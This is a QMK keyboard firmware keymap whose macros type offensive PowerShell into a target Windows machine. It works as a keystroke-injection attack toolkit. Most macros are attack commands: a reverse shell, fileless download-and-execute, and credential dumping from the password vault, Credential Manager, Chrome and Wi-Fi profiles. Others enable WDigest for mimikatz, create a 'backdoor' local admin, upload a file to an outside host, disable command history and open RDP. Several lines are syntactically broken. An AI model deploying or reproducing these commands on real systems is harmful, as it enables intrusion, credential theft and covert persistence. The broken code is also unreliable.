/* Copyright 2020 Hugh Mungis
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
#include QMK_KEYBOARD_H
#include "ake160886.h"
//YOUR MACROS MUST BE ENUMERATED HERE BEFORE YOU CAN USE THEM
enum custom_keycodes {
    PSPT = SAFE_RANGE,
    QMKURL,
    MY_OTHER_MACRO,
    PS01,
    PS02,
    PS03,
    PS04,
    PS05,
    PS06,
    PS07,
    PS08,
    PS09,
    PS10,
    PS11,
    PS12,
    PS13,
    PS14,
    PS15,
    PS16,
    PS17,
    PS18,
    PS19,
    PS20,
    PS21,
    PS22,
    PS23,
    PS24,
    PS25,
    PS26,
    PS27,
    PS28,
    PS29,
    PS30,
    PS31,
    PS32,
    PS33,
    PS34,
    PS35,
    PS36,
    PS37,
    PS38,
    PS39,
    PS40,
    PS41,
    PS42,
    PS43,
    PS44,
};

// in keyboard.c
// You could technically add more layers if 160 keys are not enough
// This is me trying to make a normal-ish layout in the middle of the keyboard, leaving the rest unassigned
// Going to need a wiiiide editor window for this to look readable
// Available keycodes are at https://github.com/qmk/qmk_firmware/blob/master/docs/keycodes.md
const uint16_t PROGMEM keymaps[] [MATRIX_ROWS][MATRIX_COLS] = {
  [0] = LAYOUT( \
    KC_MPLY,          KC_MPRV, KC_MNXT,  KC_F1,   KC_F2,   KC_F3,   KC_F4,   KC_F5,   KC_F6,   KC_F7,   KC_F8,   KC_F9,   KC_F10,  KC_F11,  KC_F12,  KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,
    KC_MUTE, KC_NO,     KC_NO,   KC_NO,   KC_1,    KC_2,    KC_3,    KC_4,    KC_5,    KC_6,    KC_7,    KC_8,    KC_9,     KC_0, KC_MINS,  KC_EQL,  KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,

    KC_ESC,  KC_NO,   KC_NO,   KC_NO,    KC_GRV,  KC_NO,         KC_NO,         KC_NO,       KC_NO,       KC_NO,          KC_NO,      KC_NO,      KC_NO,      KC_NO,    KC_NO,            KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,
    KC_NO,   KC_NO,   KC_NO,   KC_NO,    KC_TAB,  KC_Q,    KC_W,    KC_E,    KC_R,    KC_T,    KC_Y,    KC_U,    KC_I,    KC_O,    KC_P,    KC_LBRC, KC_RBRC, KC_BSLS,  KC_NO,   KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,
    KC_NO,   KC_NO,   KC_NO,   KC_NO,    KC_CAPS, KC_A,    KC_S,    KC_D,    KC_F,    KC_G,    KC_H,    KC_J,    KC_K,    KC_L,    KC_SCLN, KC_QUOT, KC_NO,    KC_ENT,  KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,   KC_NO,
    KC_NO,   KC_NO,   KC_NO,   KC_NO,    KC_NO,   KC_LSFT, KC_NO,   KC_Z,    KC_X,    KC_C,    KC_V,    KC_B,    KC_N,    KC_M,    KC_COMM, KC_DOT,  KC_SLSH, KC_NO,    KC_RSFT, KC_NO,   KC_NO,    KC_NO,   KC_NO,   KC_NO,   KC_NO,
    BIBL,             KC_NO,   KC_NO,    KC_NO,   KC_LCTL, KC_LWIN,             KC_LALT,             KC_SPC,        KC_RALT, KC_NO,   KC_APP,                           KC_RCTL,          KC_NO,    KC_NO,   KC_NO,   KC_NO       )};

// Optional override functions below.
// You can leave any or all of these undefined.
// These are only required if you want to perform custom actions.

/*
void matrix_init_kb(void) {
    // put your keyboard start-up code here
    // runs once when the firmware starts up

    matrix_init_user();
}

void matrix_scan_kb(void) {
    // put your looping keyboard code here
    // runs every cycle (a lot)

    matrix_scan_user();
}

bool process_record_kb(uint16_t keycode, keyrecord_t *record) {
    // put your per-action keyboard code here
    // runs for every action, just before processing by the firmware

    return process_record_user(keycode, record);
}

bool led_update_kb(led_t led_state) {
    // put your keyboard LED indicator (ex: Caps Lock LED) toggling code here

    return led_update_user(led_state);
}
*/


bool process_record_user(uint16_t keycode, keyrecord_t *record) {
    switch (keycode) {
    case PSPT:
        if (record->event.pressed) {
            // When keycode PSPT is pressed. Powersploit is sent as a Base64 encoded string to the target computer.
            SS_LCTRL("r")SEND_STRING("powershell.exe")SEND_STRING("");
        } else {
            // when keycode QMKBEST is released
        }
        break;

    case QMKURL:
        if (record->event.pressed) {
            // when keycode QMKURL is pressed
            SEND_STRING("https://qmk.fm/\n");
        } else {
            // when keycode QMKURL is released
        }
        break;

    case MY_OTHER_MACRO:
        if (record->event.pressed) {
           SEND_STRING(SS_LCTL("ac")); // selects all and copies
        }
        break;

    case PS01: // this checks the powershell version
        if (record->event.pressed) {
           SEND_STRING("$PSVersionTable"); 
        }
        break;

    case PS02: // current domain info
        if (record->event.pressed) {
           SEND_STRING("[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()"); 
        }
        break;

    case PS03:// this gets the DCs on a domain
        if (record->event.pressed) {
           SEND_STRING("net group \"domain controllers\" /domain"); // current domain info
        }
        break;

    case PS04:// simple powershell reverse shell
        if (record->event.pressed) {
           SEND_STRING("$sm=(New-Object Net.Sockets.TCPClient('$RHOST',$RPORT)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"); // current domain info
        }
        break;

    case PS05: // set MAC address
        if (record->event.pressed) {
           SEND_STRING("Set-NetAdapter -Name \"EXAMPLE HERE\" -MacAddress \"00-01-02-03-04-05\""); 
        }
        break;
    
    case PS06: // NOISY. With this command we can identify files with potentially sensitive data such as account information, credentials, configuration files etc based on their filename.
        if (record->event.pressed) {
           SEND_STRING("gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue"); 
        }
        break;

    case PS07: // Find credentials in Sysprep or Unattend files
        if (record->event.pressed) {
           SEND_STRING("gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue");
        }
        break;

    case PS08: // Find configuration files containing “password” string
        if (record->event.pressed) {
           SEND_STRING("gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"); 
        }
        break;
            
    case PS09: // Find database credentials in configuration files
        if (record->event.pressed) {
           SEND_STRING("gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"); 
        }
        break;
            
    case PS10: // Locate web server configuration files
        if (record->event.pressed) {
           SEND_STRING("gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue"); 
        }
        break;
            
    case PS11: // Get stored passwords from Windows PasswordVault
        if (record->event.pressed) {
           SEND_STRING("[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }"); 
        }
        break;
            
    case PS12: // Get stored passwords from Windows Credential Manager
        if (record->event.pressed) {
           SEND_STRING("Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"); 
        }
        break;
            
    case PS13: // Dump passwords from Google Chrome browser
        if (record->event.pressed) {
           SEND_STRING("[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))"); 
        }
        break;
                       
    case PS14: // Get stored Wi-Fi passwords from Wireless Profiles
        if (record->event.pressed) {
           SEND_STRING("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\W+\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize"); 
        }
        break;
                       
    case PS15: // Search for SNMP community string in registry
        if (record->event.pressed) {
           SEND_STRING("gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue"); 
        }
        break;
                       
    case PS16: // Search registry for auto-logon credentials
        if (record->event.pressed) {
           SEND_STRING("gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select \"Default*\""); 
        }
        break;
                       
    case PS17: // Check if AlwaysInstallElevated is enabled. if it works, generate the malicious .msi in msfvenom with the following command: msfvenom -p windows/exec CMD='net localgroup administrators joe /add' -f msi > pkg.msi
        if (record->event.pressed) {
           SEND_STRING("gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated; gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated"); 
        }
        break;
                       
    case PS18: // Find unquoted service paths
        if (record->event.pressed) {
           SEND_STRING("gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\Windows*\" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name"); 
        }
        break;
                       
    case PS19: // Check for LSASS WDigest caching. If value is 0, mimikatz won't work and you'll have to use the next command. Otherwise enjoy!
        if (record->event.pressed) {
           SEND_STRING("(gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential"); 
        }
        break;
                       
    case PS20: // Enable LSASS caching in order for mimikatz to work on the target machine
        if (record->event.pressed) {
           SEND_STRING("sp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest -name UseLogonCredential -value 1"); 
        }
        break;
                       
    case PS21: // Checks for credentials in group policy preferences.
        if (record->event.pressed) {
           SEND_STRING("gci * -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | select-string password; Pop-Location"); 
        }
        break;
                       
    case PS22: // Enable RDP connections
        if (record->event.pressed) {
           SEND_STRING("Get-WmiObject -Class \"Win32_TerminalServiceSetting\" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1); Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\cimv2\terminalservices -Filter \"TerminalName='RDP-tcp'\").SetUserAuthenticationRequired(0); Get-NetFirewallRule -DisplayGroup \"Remote Desktop\" | Set-NetFirewallRule -Enabled True"); 
        }
        break;
                       
    case PS23: // Host discovery using mass DNS reverse lookup
        if (record->event.pressed) {
           SEND_STRING("$net = "10.10.1."0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(\"\s+\","").replace(\"`r\","").replace(\"`n\"," "); Write-Output \"$net$_ $r\"} | tee ip_hostname.txt"); 
        }
        break;
                       
    case PS24: // Port scan a host for interesting ports
        if (record->event.pressed) {
           SEND_STRING("$ip = "10.10.15.232"; $ports = "21 22 23 25 53 80 88 111 139 389 443 445 873 1099 1433 1521 1723 2049 2100 2121 3299 3306 3389 3632 4369 5038 5060 5432 5555 5900 5985 6000 6379 6667 8000 8080 8443 9200 27017"; $ports.split(" ") | % {echo ((new-object Net.Sockets.TcpClient).Connect($ip,$_)) \"Port $_ is open on $ip\"} 2>$null"); 
        }
        break;
                       
    case PS25: // scan network for a single port
        if (record->event.pressed) {
           SEND_STRING("$port = 22; $net = "10.10.0."0..255 | foreach { echo ((new-object Net.Sockets.TcpClient).Connect($net+$_,$port)) \"Port $port is open on $net$_\"} 2>$null"); 
        }
        break;
                       
    case PS26: // Create a guest SMB shared drive
        if (record->event.pressed) {
           SEND_STRING("new-item \"c:\users\public\share\" -itemtype directory New-SmbShare -Name \"sharedir\" -Path \"C:\users\public\share\" -FullAccess \"Everyone\",\"Guests\",\"Anonymous Logon\"");
        }
        break;
                       
    case PS27: // delete the previously created SMB drive
        if (record->event.pressed) {
           SEND_STRING("Remove-SmbShare -Name "sharedir" -Force"); 
        }
        break;
                       
    case PS28: // Whitelist an IP address in Windows firewall
        if (record->event.pressed) {
           SEND_STRING("New-NetFirewallRule -Action Allow -DisplayName \"pentest\" -RemoteAddress 10.10.15.123"); 
        }
        break;

    case PS29: // remove the firewall rule created in PS28
        if (record->event.pressed) {
           SEND_STRING("Remove-NetFirewallRule -DisplayName \"pentest\""); 
        }
        break;

    case PS30: // File-less download and execute
        if (record->event.pressed) {
           SEND_STRING("iex(iwr(\"https://URL\"))"); 
        }
        break;

    case PS31: // Get current user SID
        if (record->event.pressed) {
           SEND_STRING("([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value"); 
        }
        break;

    case PS32: // Check if we're admin
        if (record->event.pressed) {
           SEND_STRING("If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")) { echo \"yes\"; } else { echo \"no\"; }"); 
        }
        break;

    case PS33: // Disable powershell logging. (probably only useful in red team exercises)
        if (record->event.pressed) {
           SEND_STRING("Set-PSReadlineOption –HistorySaveStyle SaveNothing"); 
        }
        break;

    case PS34: // Check what antivirus is installed
        if (record->event.pressed) {
           SEND_STRING("Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct"); 
        }
        break;

    case PS35: // record powershell session to file
        if (record->event.pressed) {
           SEND_STRING("$Start-Transcript c:\path\to\record.txt"); 
        }
        break;

    case PS36: // Check computer domain
        if (record->event.pressed) {
           SEND_STRING("(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain"); 
        }
        break;

    case PS37: // Get workgroup name
        if (record->event.pressed) {
           SEND_STRING("(Get-WmiObject -Class Win32_ComputerSystem).Workgroup"); 
        }
        break;

    case PS38: // Check Program Files directories
        if (record->event.pressed) {
           SEND_STRING("Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime"); 
        }
        break;

    case PS39: // List local users
        if (record->event.pressed) {
           SEND_STRING("Get-LocalUser | ft Name,Enabled,LastLogon"); 
        }
        break;

    case PS40: // List of local admins
        if (record->event.pressed) {
           SEND_STRING("Get-LocalGroupMember Administrators"); 
        }
        break;

    case PS41: // Create new local admin
        if (record->event.pressed) {
           SEND_STRING("New-LocalUser \"backdoor\" -Password (ConvertTo-SecureString \"P@ssw0rd\" -AsPlainText -Force)"); 
        }
        break;

    case PS42: // Upload file to HTTP server. Pairs well with https://gist.github.com/UniIsland/3346170
        if (record->event.pressed) {
           SEND_STRING("(New-Object System.Net.WebClient).UploadFile(\"http://192.168.204.190/\", \"POST\", \"c:\test\file.zip\");"); 
        }
        break;

    case PS43: // List proxy settings
        if (record->event.pressed) {
           SEND_STRING("gp \"Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\""); 
        }
        break;

    case PS44: // Send an email
        if (record->event.pressed) {
           SEND_STRING("Send-MailMessage -SmtpServer <smtp-server> -To joe@example.com -From sender@example.com -Subject \"subject\" -Body \"message\" -Attachment c:\path\to\attachment"); 
        }
        break;

    }
    return true;
};
